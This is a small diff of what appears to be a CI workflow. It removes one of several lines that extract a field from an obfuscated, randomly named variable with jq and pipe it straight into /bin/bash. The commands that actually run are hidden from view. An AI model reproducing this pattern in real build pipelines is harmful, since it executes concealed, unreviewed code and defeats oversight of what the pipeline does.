@@ -45,7 +45,6 @@ jobs:
           printf '%s' "$xogj09" | jq -r .vsdbp21 | /bin/bash
           echo $d7 | jq -r .in7801 | /bin/bash
           echo $q39021 | jq -r .bicd63156 | /bin/bash
-          printf '%s' "$sp0140" | jq -r .uji69935 | /bin/bash
           echo $nxjds0 | jq -r .eiecu3 | /bin/bash
           echo $znj035 | jq -r .sguy085 | /bin/bash
           echo $c23 | jq -r .snec637 | /bin/bash
